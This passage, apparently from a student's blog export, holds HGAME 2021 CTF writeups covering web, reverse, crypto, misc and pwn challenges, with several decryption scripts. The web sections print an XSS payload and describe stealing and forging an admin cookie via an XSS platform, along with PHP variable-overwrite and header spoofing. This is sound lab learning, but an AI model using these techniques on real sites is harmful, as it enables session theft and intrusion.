出题人用可部署单位画了个东西 背景是白色的 ​ 记录部署操作？！那就打开 getBattleReplay 文件，看到像是 base64 编码的字符串，解码看到 zip 文件头标识另存为 zip，解压打开发现配对的 row 和 col ，应该是部署的坐标，再根据题目里的 画了个东西 猜测这些坐标是二维码黑色部分，处理一下再运行脚本 ​ 扫码得flag 2.A R C​ 压缩包加密了，那就先看图片找密码 ​ 刚开始误以为 BV 是某种 CTF 中的加密方式，在网上搜索了一圈没有收获，于是去问 Akira 学长 BV 除了 b站BV号还有什么意思，学长的答复是 ​ 怎么实现的？查 av号怎样转 bv号后发现 https://www.zhihu.com/question/381784377/answer/1099438784 这个回答里的实现方法，根据 hint1：8558 应该理解成85和58，BV号_是所以图片里的是__ 先对图里的密文进行 base85 解密 ​ 根据长度判断应该是 av号转 bv号算法里的table，那就换一下上面链接里代码的table，密文是压缩包名里的数字，跑一下得到压缩包密码 ​ 打开后得到一段 arc 视频和密文，用题目里给的软件播放视频得到 ​ 发现图中第一行文字和文本里文字相似，猜测是同种加密方式，之后又没有思路了，hint2里提到 词频分析是个好东西，别忘了视频里的问题 ，查了下视频里的问题但没什么发现。后来又放出hint 用了某种ROT的范围，但是位移不一样 ，根据两个字符的应该是 is 之类的尝试将每个字符后移10位，得到了一段英文，然后又卡住了。于是又去问 Akira学长，学长说并不是后移10位提示我再想想视频里问题的答案，突然想起之前有查到 42 这个数字，尝试后移42位得到正确的文字 ​ 视频里文字第一行也是后移 42位得到 MSU 密码，解密得到的文字里提到视频里第二行的加密方法 Liki学长提到过，根据 week1 crypto的第一题，第二行文字加密方法应该是维吉尼亚，密钥是 Akira ​ 在 virtualDub2里安装MSUstego插件，用之前得到的密码对视频进行解密，得到网址、光和对立的名字，访问网站输入用户名和密码 ​ 根据hint5: / 不是可输入的意思，是网站路径，想起之前视频解出的第二行还没用上，那就在网站路径后输入解出的明文，得到flag（pm） ​ 这周misc虽然难但很有趣，梗挺多的 总结：​ 这周因为跟父母回老家拜年少了很多做题的时间，之后电脑还出了故障重装了系统，下周要专注于re了，不能再靠着 misc 和 crypto 上分了 接下来是没做出来的部分 re​ Gun这道题用查壳工具查得是梆梆免费版加固，想要脱壳，用了很多网上查到的方法但都失败了，问了 Trotsky学长，推荐使用frida-dexdump脱壳，但是因为这道题需要root过的真机（模拟器不行）来进行脱壳，所以最后只能放弃 ​ hello_re3我没太搞明白，拖进ida发现应该都是调试信息，mezone学长说要用dbgview看调试信息再定位到程序里，可惜这题是最后一天才做的，最后没时间了，打算看官方writeup再学习一下 Crypto​ EncryptedChats这题尝试了各种方法去解，还是解不出 a 和 b ，需要的时间都很长，但是 g 挺大（不是2、5这种很小的） a 跟 b 应该是能解出来的…","link":"/2021/03/27/HGAME-Week3-Writeup/"},{"title":"HGAME-Week2-Writeup","text":"Week2 Web1.LazyDogR4U​ 首先打开题目地址 ​ 根据题目给的hint，在地址栏后面加上 /www.zip 获得网页源码 ​ 接着打开 lazy.php 和 flag.php 这两个php文件，再根据变量覆盖的提示找到漏洞点 ​ 这里划线处的两个$符号容易导致变量覆盖，那么根据 flag.php 中得到flag的条件就可以进行构造，相当于： $_SESSSION[username]=admin ​ 双写SESSION是因为上面str_replace的过滤 ​ 得到flag 2.Post to zuckonit​ ​ 点开后发现是留言板，题目也很明确的指出是xss，那么就先尝试输入 script，iframe，image ​ 输入后发现不管大小写 script 都会被过滤掉，小写的 iframe 会被过滤，image则不会被过滤 ​ 之后尝试输入 img src=1 onerror = alert(1) ，让错误的图片导致弹窗 ​ 输出了这么个东西，把这个输入再 post 就会弹窗，成功弹窗之后就是找一个 xss 平台来接受 cookie 信息 ​ 根据之前的规律 post 平台给的语句，并用脚本得出 md5 验证码提交，接收到 cookie 信息 脚本： 12345678910import hashlibdef md5(s): return hashlib.md5(s.encode()).hexdigest()def get_code(): code = 'XXXXXX' for i in range(10000000, 99999999): #8位md5 if md5(str(i)).startswith(code): return str(i)print(get_code()) ​ 接着就伪造 admin cookie 得到flag Re1.ezApk​ 安卓逆向，用 jadx 反编译为 java，找到 onClick 事件 ​ 这条判断语句是关键，在资源文件中找到加密后的 flag 和 key ​ s函数用来加密输入的字符串，转到s函数分析 ​ 仔细分析后得知是AES CBC模式加密，密钥是之前的key经过sha-256加密得到的，iv向量则是key经过MD5加密得到的，最后将加密结果再进行一次 base64 加密得到之前的 flag ​ 尝试用在线网站解密，但是网站一般只支持 16 位 iv 值解密，没有别的办法只能东拼西凑写出 java 脚本来解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package com.company;import javax.crypto.Cipher;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Base64;public class Main { //md5,sha-256加密 public static byte[] t(String str, String str2) { MessageDigest instance = null; try { instance = MessageDigest.getInstance(str); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } byte[] bytes = str2.getBytes(); byte[] digest = instance.digest(bytes); return digest; } //解密 public static String desEncrypt(String data, byte[] key) { byte[] ivString = t(&quot;MD5&quot;,&quot;A_HIDDEN_KEY&quot;); //iv向量 byte[] iv = ivString; try { byte[] encryp = Base64.getDecoder().decode(data); Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS7Padding&quot;); SecretKeySpec keySpec = new SecretKeySpec(key, &quot;AES&quot;); IvParameterSpec ivSpec = new IvParameterSpec(iv); cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec); byte[] original = cipher.doFinal(encryp); return new String(original); } catch (Exception e) { e.printStackTrace(); } return null; } public static void main(String[] args) { String data = &quot;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&quot;; //密文 byte[] key =t(&quot;SHA-256&quot;,&quot;A_HIDDEN_KEY&quot;); //密钥 String desencrypt = desEncrypt(data, key); System.out.println(&quot;解密后:&quot;+desencrypt); }} ​ 因为要用到的是AES 256位解密，而 java 本身只支持 128位 AES 解密，所以就要做其他的一些配置才能解密 2.helloRe2​ 拖进 IDA 分析，乍一看结构有点复杂，password1 的判断在后半部分，而password2 的判断在前半部分，先分析 password1 ​ 关键部分是这条判断，判断输入的password长度和 password 经过一系列操作后的结果，用 ollydbg 调试并不断猜测，得知这么一系列操作就是判断输入的字符串是否是给出的密文的逆序 ​ 之后再分析 pwd2 ​ 应该又是AES CBC 模式加密，找到 iv 和 密钥，密钥是pwd1经过异或得到，密文是已经给出密文的逆序 ![](D:\\HGAME2021\\HGAME week2\\re2(4).png) ​ 解密就用上一题的脚本 ​ 这里看着像是两次加密，但其实只有一次 3.fake_debugger beta​ nc题目地址，发现只有在 ebx 经过一次转换后与 eax 相等才能继续调试，之后不断调试发现 ​ 转换前的 ebx 与 eax 异或后就是 flag 中的字符，那就一个个调试下来得到 flag Crypto1.gcd or more?​ ​ 看着像是RSA，但是e = 2。百度后查到低指数爆破，之后又看到Rabin算法，特征是e = 2 ，那么就用这个脚本解题 12345678910111213141516171819202122import gmpy2import libnume = 2p = 85228565021128901853314934583129083441989045225022541298550570449389839609019q = 111614714641364911312915294479850549131835378046002423977989457843071188836271n = p * qc = 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539#c= int(open('./flag.enc','rb').read().encode('hex'),16)mp = pow(c, (p + 1) // 4, p)mq = pow(c, (q + 1) // 4, q)yp = gmpy2.invert(p, q)yq = gmpy2.invert(q, p)r = (yp * p * mq + yq * q * mp) % nrr = n - rs = (yp * p * mq - yq * q * mp) % nss = n - sprint(libnum.n2s(int(r)))print(libnum.n2s(int(rr)))print(libnum.n2s(int(s)))print(libnum.n2s(int(ss))) 2.WhitegiveRSA​ ​ 已知N，那就拿到在线网站里分解出大素数 q 和 p，剩下来都已知就用脚本解密 Misc1.Tools​ 下载解压得到一个压缩包和一张图片，根据题目的 tools 和压缩包名 f5 尝试用 f5 工具破解压缩包密码，破解所需的密码在图片的详细信息中 ​ 打开加密压缩包后发现一部分二维码和压缩包，接着就是像之前那样找到压缩包名里的工具解密，最终集齐4张二维码碎片，用win10自带的画图工具拼合，扫码得flag 2.Telegraph：1601 6639 3459 3134 0892​ 题目为音频隐写，又提到听着反胃，于是猜测是摩斯电码。听了之后，中间有一段嘀嗒声，这一段就是需要摩斯解密的部分，接着把音频拖到 Audacity 里面分析 ​ 首先看一下频谱图 ​ 得到850hz的提示，之后尝试翻译摩斯电码，发现中间有一段无法辨认就想到要滤波，用的是上面的提示 ​ 窄的是**.** 宽的是**-** ，翻译后解密就得到flag 3.Hallucigenia​ 只给了一张图，那么就先用 Stegsolve 左右调一下得到二维码 ​ 扫码得到一串 base64 解码发现最后是 GNP ，根据题目中 **“我们不仅弄错了他的上下，还颠倒了它的左右。” **逆序处理后粘贴到winhex保存为图片 ​ 发现又是上下左右颠倒，倒回来就得flag 4.DNS​ 流量包分析，筛选 dns 得到一串域名并访问 ​ 抓包得 ​ 查一下 SPF 知道是一种 dns 记录，那就用在线网站查一下dns记录，得到flag 总结：​ 这周比较摸鱼，web 能做出两道是因为给了具体的考点，参照往年 writeup 一点点做下来。 re 做了很久，因为之前没有接触过 apk 逆向，对 aes 加密也不太了解，最后能全部做出来真是太好了，逆向的时候果然是要抓重点，解完题后才发现其实挺简单的。 密码学是真不太行，这周 pwn 也基本没看，Misc 倒是做的挺顺畅的，下周要试着把之前的知识捡起来了","link":"/2021/03/27/HGAME-Week2-Writeup/"},{"title":"HGAME-Week1-writeup","text":"Week1 1.web1.Hitchhiking_in_the_Galaxy​ 网页f12发现 /HitchhikerGuide.php , 抓包发现 302, 于是在 Linux 中用 curl 命令访问这里,发现 405 那么就改用 post 请求方式 ​ 刚开始看到这句话后没有一点想法,就去看了看发的学习资料,看到 user-agent 后意识到应该是要加这个头 (因为引擎) , 内容是那串英文 ​ 仅能通过本地访问 , 那么就再加一个 x-forwarded-for 头 , 最后说要从茄子学长的网站过来 , 再加一个 referer 头,得到 flag 2.watermelon​ 打开网页发现是合成大西瓜, 玩了一遍发现要达到2000分才能得到flag, 于是毫不犹豫地抓包(可惜接受不到分数,是为什么我也不清楚) 抓包不行那么就只能修改 js 代码,然而在我试图修改的过程中发现 ​ 把网页变成这样就能轻松玩到2000分! (到底怎么改js代码我不太清楚,应该是要找到存储分数的变量,然后在 console 里修改…..) ​ 得到 flag 3.宝藏走私者​ 先拿着学习资料学习了一下,之后点开网页点击 secret data 跳转到另一个界面,提示要是 localhost ,于是加了 host 头 ​ 意外的就得到了 flag (不知道怎么得到的, 好像跟学习资料无关?) 4.智商检测鸡​ 用 firefox 浏览器打开网页发现要做100道定积分才能得到 flag, f12看到网页源代码,里面有个 getflag() 函数 ​ 在 console 输入后,弹出一句话(是啥我忘了) , 得知这样不行,于是我就搭配定积分计算器解完了这100题,得到 flag (之后看r4u学长发的学习资料,觉得应该是 python 爬虫一类的,可惜我 python 还不太会,只能手动解题了) web 总结: web 开始的时候是真的一点都不会, watermelon 和定积分都不是通过 web 知识解的, burp 也是前几天刚装的(安装花了一天…),总之学到了很多 2.reverse1.apacha​ 应该是这周 re里最难的（但其实也不是太难），首先用 ida 打开文件并初步分析 ​ 关键部分在第25和第26行的两个函数 ​ 第一个关键函数，刚开始看觉得挺复杂的后来发现了 tea 型加密算法的特征，查资料猜测这应该是 xxtea 加密算法 ​ 第二个关键函数，判断输入是否为 flag 。加密后的 flag存在unk_501C , 每四个字节一组 ​ 之后就是写脚本解密，于是在网上找了一个现成的脚本（ c语言），改了一下就得到 flag（这里有个地方需要注意，因为是小端序所以 ida 中加密的数据每四个字节要逆序才是真正的加密数据） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define tea_DELTA 0x9e3779b9#define xxtea_MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void xxtea(uint32_t* origin, int n, uint32_t const key[4]);int main(){ unsigned int data[] = { 0xE74EB323,0xB7A72836,0x59CA6FE2,0x967CC5C1,0xE7802674 ,0x3D2D54E6,0x8A9D0356,0x99DCC39C,0x7026D8ED,0x6A33FDAD, 0xF496550A,0x5C9C6F9E,0x1BE5D04C,0x6723AE17,0x5270A5C2, 0xAC42130A,0x84BE67B2,0x705CC779,0x5C513D98,0xFB36DA2D, 0x22179645,0x5CE3529D,0xD189E1FB,0xE85BD489,0x73C8D11F,0x54B5C196, 0xB67CB490,0x2117E4CA,0x9DE3F994,0x2F5AA1AA,0xA7E801FD,0xC30D6EAB, 0x1BADDC9C,0x3453B04A,0x92A406F9 }; int i, j;uint32_t* encode = (uint32_t*)data; uint32_t const key[4] = {1,2,3,4}; xxtea(encode, -35, key); for (i = 0; i &lt; 35; i++) printf(&quot;%d,&quot;, data[i]);}void xxtea(uint32_t* origin, int n, uint32_t const key[4]){ uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52 / n; sum = 0; z = origin[n - 1]; do { sum += tea_DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) { y = origin[p + 1]; z = origin[p] += xxtea_MX; } y = origin[0]; z = origin[n - 1] += xxtea_MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52 / n; sum = rounds * tea_DELTA; y = origin[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) { z = origin[p - 1]; y = origin[p] -= xxtea_MX; } z = origin[n - 1]; y = origin[0] -= xxtea_MX; sum -= tea_DELTA; } while (--rounds); }} 2.helloRe​ 这题不难，只是有点 c++ 的语法，同样 ida ​ 关键在中间的异或操作，写个脚本就能得到结果 3.pypy​ 这题考的是 python 字节码，刚开始看的时候还不太懂python语法花了点时间去理解，通过 dis 文档来分析每一条语句，大概还原了一下 ​ 理解之后就是用脚本解题，再加上 hgame{} （刚开始交的时候忘加了） 3.pwn1.whitegive​ 下载，在 Linux 中用 gdb 调试，得知输入数字在栈中的的存储位置为 0x7ffffffffde50 ​ 继续调试，发现最后 if 语句比较的是 rax 和 rdx 的值，而此时 rax 存储的是 ‘paSsw0rd’ 字符串的地址，那么只要输入这个地址的十进制值就能使条件成立 ​ nc连接，cat flag（的确挺白给的，毕竟我都能做） pwn 总结：我也太菜了只解出白给题 ,看了最后一题但不太会 rop , 总之这周就稍微学习了一下怎么写 pwn 的脚本和一些基础知识以及安装工具 4.crypto2.对称之美​ 打开链接下载 python 文件 ​ key 是在 ascii 字母和数字里随机选取16个组成，而 cipher 是由明文与循环的 key 异或得到的密文 ​ 根据异或特性知道密文与循环的 key 异或就是明文，那么这道题重点就是求出一组 key 。多次下载附件发现 cipher 各不同，那就利用多个密文写脚本爆破得到前16位明文 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849table = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;de0 = []c = []for i in range(0,130): c.append(0)flag = []#for i in range(0, 16):for j in range(0, 62): de0.append(xor(cipher0[15], table[j])) de0.append(xor(cipher1[15], table[j])) de0.append(xor(cipher2[15], table[j])) de0.append(xor(cipher3[15], table[j])) de0.append(xor(cipher4[15], table[j])) de0.append(xor(cipher5[15], table[j])) de0.append(xor(cipher6[15], table[j])) de0.append(xor(cipher7[15], table[j])) de0.append(xor(cipher8[15], table[j])) de0.append(xor(cipher9[15], table[j])) de0.append(xor(cipher10[15], table[j])) de0.append(xor(cipher11[15], table[j])) de0.append(xor(cipher12[15], table[j])) de0.append(xor(cipher13[15], table[j])) de0.append(xor(cipher14[15], table[j])) de0.append(xor(cipher15[15], table[j])) de0.append(xor(cipher16[15], table[j])) de0.append(xor(cipher17[15], table[j])) de0.append(xor(cipher18[15], table[j])) de0.append(xor(cipher19[15], table[j])) de0.append(xor(cipher20[15], table[j])) de0.append(xor(cipher21[15], table[j])) de0.append(xor(cipher22[15], table[j])) de0.append(xor(cipher23[15], table[j])) de0.append(xor(cipher24[15], table[j])) de0.append(xor(cipher25[15], table[j])) de0.append(xor(cipher26[15], table[j])) de0.append(xor(cipher27[15], table[j])) de0.append(xor(cipher28[15], table[j])) de0.append(xor(cipher29[15], table[j])) de0.append(xor(cipher30[15], table[j])) de0.append(xor(cipher31[15], table[j])) de0.append(xor(cipher32[15], table[j])) de0.append(xor(cipher33[15], table[j]))for j in de0: c[j] = c[j] + 1for j in range(0, 128): if c[j] == 34: print(j) ​ 知道前16位明文，那就可以求得一组 key ，并得到 flag，过程同样是写脚本 ​ Get flag! 3.Transformer​ 下载，发现其中一个文件中有flag形式的字符串，还有两个文件分别存储明文和密文，虽然顺序是打乱了的 ​ 接下来就采用传统的人工查找明文和密文一一对应的方式得到flag ​ 当然那个 txt 文件最后解密还提示 flag 后面要加上年份2021才正确 （搜了一下题目发现是人工智能模型，我只有人工没有智能……） crypto 总结：没想到最后竟是第一题没解出来，本来以为第二题解不出来反而解出来了。这周稍微学了点怎样写解密脚本，收获挺大 5.misc1.Base全家福​ 题目中提到 base家族，查资料得知有不只有 base64 ，再根据不同 base 加密字符的特征多次解密 ​ 如图所示，得到 flag 2.不起眼压缩包的养成的方法​ 打开得到图片，题目中提到了压缩包，猜测能从图片中得到压缩包，于是在 linux 中用 binwalk 检测发现了压缩包，并用 foremost 命令分离出来 ​ 分离解压后得到 ​ 发现得到里面的文件需要密码，那就用百度识图来获取之前得到的图片的p站id解密。之后点进plain.zip发现又需要密码，并且发现plain.zip里有flag.zip和相同的NO PASSWORD.txt文件，猜测是利用明文攻击解密，用相同的方式压缩已得到的NO PASSWORD.txt。 ​ 根据提示storage，用仅存储的方式压缩（刚开始不知道storage是存储等级所以卡了一会儿，问了学长后才知道） 再用ARCHPR进行破解，得到口令和密钥，最后得到flag.zip的内容。16进制转字符串，得flag 3.Galaxy​ 打开连接下载，得到以**.pcapng**为后缀的文件，之后用 wireshark 打开 ​ 如图所示，导出 http 流 ​ 找到了遗失的 galaxy 图片，在 windows 下能正常打开，但之后把图片放到 linux 中，想用 binwalk 分析的时候发现在 Linux 下无法打开图片。 ​ 上网查资料得知图片的高和宽可能被修改，与原来 crc 值不匹配才报错。于是在网上找了个脚本，得到正确的高宽 ![](HGAME-Week1-writeup/misc3 (2).png) ​ 然后就用 winhex 修改高和宽并保存 ​ 得到 flag！ 4.Word RE:MASTER​ 下载得两个文档，发现其中一个文档加密了，那就先打开另一个文档 ​ 在 first.docx 文档中发现了 brain 和 fuck 两个单词，猜测有brainfuck 加密，但是之后因为不知道密文卡了很久，尝试用 winhex 打开另一个文档得到 ​ 我以为这就是密文了，于是就开心的拿去解密网站解密（当然这是错的） ​ 问了Akira 学长后发现这密文缺少了前半部分，只能转用别的方法。首先尝试把第一个文档的后缀改为 zip ，打开后竟发现 ​ ​ 丢到网站解密后得到 DOYOUKNOWHIDDEN? ，用这个打开第二个文档 ​ 因为这个文档密码是 DOYOUKNOWHIDDEN? ，所以立马显示 word 的隐藏字符，得到 ​ 一堆空白字符，由空格和制表符组成，这里我用箭头和点表示 ​ 这之后就卡了很久（大概一天多……），我甚至尝试用二进制01表示，实在想不出来了于是去问学长，提示我搜一下第二个文档图片中出现最多的字的英文（之前一直盯着图片内容看，以为hint是音游梗，果然是我想太多orz） ​ 接着就搜索snow，知道了空白字符的隐写，上工具解密 misc总结：拿到题目后完全没思路，所以在这一周中查了很多资料，觉得自己就是个菜鸡，好在最后全部解了出来，也学到了很多东西","link":"/2021/03/26/HGAME-Week1-writeup/"}],"tags":[{"name":"re","slug":"re","link":"/tags/re/"},{"name":"wp","slug":"wp","link":"/tags/wp/"},{"name":"hgame","slug":"hgame","link":"/tags/hgame/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"反调试","slug":"反调试","link":"/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"upx","slug":"upx","link":"/tags/upx/"},{"name":"MFC","slug":"MFC","link":"/tags/MFC/"},{"name":"riscv","slug":"riscv","link":"/tags/riscv/"},{"name":"gdb","slug":"gdb","link":"/tags/gdb/"},{"name":"qemu","slug":"qemu","link":"/tags/qemu/"},{"name":"idapython","slug":"idapython","link":"/tags/idapython/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"ruby","slug":"ruby","link":"/tags/ruby/"}],"categories":[{"name":"Hgame2021","slug":"Hgame2021","link":"/categories/Hgame2021/"}]}